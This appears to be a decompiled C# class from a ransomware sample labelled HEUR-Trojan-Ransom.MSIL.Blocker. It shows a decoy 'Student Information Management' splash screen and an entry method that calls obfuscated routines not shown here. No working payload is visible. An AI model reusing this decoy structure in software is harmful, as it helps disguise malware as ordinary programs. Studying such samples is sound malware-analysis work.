// Decompiled with JetBrains decompiler
// Type: Sc0.Te5
// Assembly: Xy1, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 1751620F-F01F-4C10-919D-3F62724BF094
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.05-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-718c39e3856531aa6e7a97e805911b001e035e773661129f6877deb00e732201.exe

using Fc96;
using i7D;
using Microsoft.VisualBasic.CompilerServices;
using Pk7n;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

namespace Sc0
{
  [DesignerGenerated]
  public class Te5 : Form
  {
    private IContainer components;

    public Te5()
    {
      this.Load += new EventHandler(this.Zr1);
      this.d9A();
    }

    private void Zr1(object Ap6, EventArgs z7X)
    {
    }

    private void Zq0(object a9W, EventArgs Ak0)
    {
    }

    private void Rp2(object k4L, EventArgs c8B)
    {
    }

    private void d3E(object Pt0, EventArgs Zw4)
    {
      checked { ++this.ProgressBar1.Value; }
      this.Label2.Text = this.ProgressBar1.Value.ToString() + "%";
      if (this.ProgressBar1.Value < 100)
        return;
      this.Timer1.Enabled = false;
      r6W7.Forms.LoginForm1.Show();
      this.Close();
    }

    private void Zc3(object j5H, EventArgs Bs5)
    {
    }

    private void q5K(object Tk5, EventArgs q8A)
    {
    }

    [STAThread]
    public static void w2R()
    {
      try
      {
        if (!e3G1.a9J1(2) || !e3G1.Wi08())
          return;
        Mi8.f6T(1);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        Environment.Exit(Environment.ExitCode);
        ProjectData.ClearProjectError();
      }
    }

    private void c4Q(object d8C, EventArgs Kk1)
    {
    }

    private void As3(object Le9, EventArgs w1Y)
    {
    }

    private void c8N(object Hr1, PaintEventArgs Lf5)
    {
    }

    [DebuggerNonUserCode]
    protected virtual void Si7(bool d8R)
    {
      try
      {
        if (!d8R || this.components == null)
          return;
        this.components.Dispose();
      }
      finally
      {
        this.Dispose(d8R);
      }
    }

    [DebuggerStepThrough]
    private void d9A()
    {
      this.components = (IContainer) new System.ComponentModel.Container();
      ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof (Te5));
      this.Panel1 = new Panel();
      this.Label1 = new Label();
      this.Timer1 = new Timer(this.components);
      this.PictureBox1 = new PictureBox();
      this.ProgressBar1 = new ProgressBar();
      this.Label2 = new Label();
      this.Label3 = new Label();
      this.Panel1.SuspendLayout();
      ((ISupportInitialize) this.PictureBox1).BeginInit();
      this.SuspendLayout();
      this.Panel1.Controls.Add((Control) this.Label1);
      this.Panel1.Location = new Point(0, 0);
      this.Panel1.Name = "Panel1";
      this.Panel1.Size = new Size(652, 48);
      this.Panel1.TabIndex = 0;
      this.Label1.BackColor = Color.SkyBlue;
      this.Label1.Font = new Font("Times New Roman", 15.75f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
      this.Label1.Location = new Point(-3, 0);
      this.Label1.Name = "Label1";
      this.Label1.Size = new Size(652, 48);
      this.Label1.TabIndex = 0;
      this.Label1.Text = "STUDENT INFORMATION MANAGEMENT";
      this.Label1.TextAlign = ContentAlignment.MiddleCenter;
      this.Timer1.Enabled = true;
      this.PictureBox1.BackColor = SystemColors.ButtonFace;
      this.PictureBox1.BackgroundImage = (Image) componentResourceManager.GetObject("PictureBox1.BackgroundImage");
      this.PictureBox1.BackgroundImageLayout = ImageLayout.Zoom;
      this.PictureBox1.Location = new Point(0, 47);
      this.PictureBox1.Name = "PictureBox1";
      this.PictureBox1.Size = new Size(649, 335);
      this.PictureBox1.TabIndex = 2;
      this.PictureBox1.TabStop = false;
      this.ProgressBar1.Location = new Point(0, 416);
      this.ProgressBar1.Name = "ProgressBar1";
      this.ProgressBar1.Size = new Size(622, 20);
      this.ProgressBar1.TabIndex = 3;
      this.Label2.BackColor = Color.Transparent;
      this.Label2.Font = new Font("Microsoft Sans Serif", 12f, FontStyle.Bold | FontStyle.Italic, GraphicsUnit.Point, (byte) 0);
      this.Label2.ForeColor = Color.Black;
      this.Label2.Location = new Point(590, 416);
      this.Label2.Name = "Label2";
      this.Label2.Size = new Size(59, 20);
      this.Label2.TabIndex = 4;
      this.Label2.TextAlign = ContentAlignment.MiddleCenter;
      this.Label3.Font = new Font("Microsoft Sans Serif", 12f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
      this.Label3.Location = new Point(0, 385);
      this.Label3.Name = "Label3";
      this.Label3.Size = new Size(652, 28);
      this.Label3.TabIndex = 5;
      this.Label3.Text = "Welcome To Student Information Management S/W.";
      this.Label3.TextAlign = ContentAlignment.MiddleCenter;
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.BackColor = SystemColors.ActiveCaption;
      this.ClientSize = new Size(648, 436);
      this.Controls.Add((Control) this.Label2);
      this.Controls.Add((Control) this.ProgressBar1);
      this.Controls.Add((Control) this.Label3);
      this.Controls.Add((Control) this.Panel1);
      this.Controls.Add((Control) this.PictureBox1);
      this.FormBorderStyle = FormBorderStyle.None;
      this.Icon = (Icon) componentResourceManager.GetObject("$this.Icon");
      this.Name = "Startup";
      this.StartPosition = FormStartPosition.CenterScreen;
      this.Text = "Welcome To S.I.M.";
      this.Panel1.ResumeLayout(false);
      ((ISupportInitialize) this.PictureBox1).EndInit();
      this.ResumeLayout(false);
    }

    internal virtual Panel Panel1
    {
      get => this._Panel1;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        PaintEventHandler paintEventHandler = new PaintEventHandler(this.c8N);
        Panel panel1_1 = this._Panel1;
        if (panel1_1 != null)
          panel1_1.Paint -= paintEventHandler;
        this._Panel1 = value;
        Panel panel1_2 = this._Panel1;
        if (panel1_2 == null)
          return;
        panel1_2.Paint += paintEventHandler;
      }
    }

    internal virtual Label Label1
    {
      get => this._Label1;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Zq0);
        Label label1_1 = this._Label1;
        if (label1_1 != null)
          label1_1.Click -= eventHandler;
        this._Label1 = value;
        Label label1_2 = this._Label1;
        if (label1_2 == null)
          return;
        label1_2.Click += eventHandler;
      }
    }

    internal virtual Timer Timer1
    {
      get => this._Timer1;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.d3E);
        Timer timer1_1 = this._Timer1;
        if (timer1_1 != null)
          timer1_1.Tick -= eventHandler;
        this._Timer1 = value;
        Timer timer1_2 = this._Timer1;
        if (timer1_2 == null)
          return;
        timer1_2.Tick += eventHandler;
      }
    }

    internal virtual PictureBox PictureBox1
    {
      get => this._PictureBox1;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.q5K);
        PictureBox pictureBox1_1 = this._PictureBox1;
        if (pictureBox1_1 != null)
          pictureBox1_1.Click -= eventHandler;
        this._PictureBox1 = value;
        PictureBox pictureBox1_2 = this._PictureBox1;
        if (pictureBox1_2 == null)
          return;
        pictureBox1_2.Click += eventHandler;
      }
    }

    internal virtual ProgressBar ProgressBar1
    {
      get => this._ProgressBar1;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Zc3);
        ProgressBar progressBar1_1 = this._ProgressBar1;
        if (progressBar1_1 != null)
          progressBar1_1.Click -= eventHandler;
        this._ProgressBar1 = value;
        ProgressBar progressBar1_2 = this._ProgressBar1;
        if (progressBar1_2 == null)
          return;
        progressBar1_2.Click += eventHandler;
      }
    }

    internal virtual Label Label2
    {
      get => this._Label2;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.c4Q);
        Label label2_1 = this._Label2;
        if (label2_1 != null)
          label2_1.Click -= eventHandler;
        this._Label2 = value;
        Label label2_2 = this._Label2;
        if (label2_2 == null)
          return;
        label2_2.Click += eventHandler;
      }
    }

    internal virtual Label Label3
    {
      get => this._Label3;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.As3);
        Label label3_1 = this._Label3;
        if (label3_1 != null)
          label3_1.Click -= eventHandler;
        this._Label3 = value;
        Label label3_2 = this._Label3;
        if (label3_2 == null)
          return;
        label3_2.Click += eventHandler;
      }
    }
  }
}
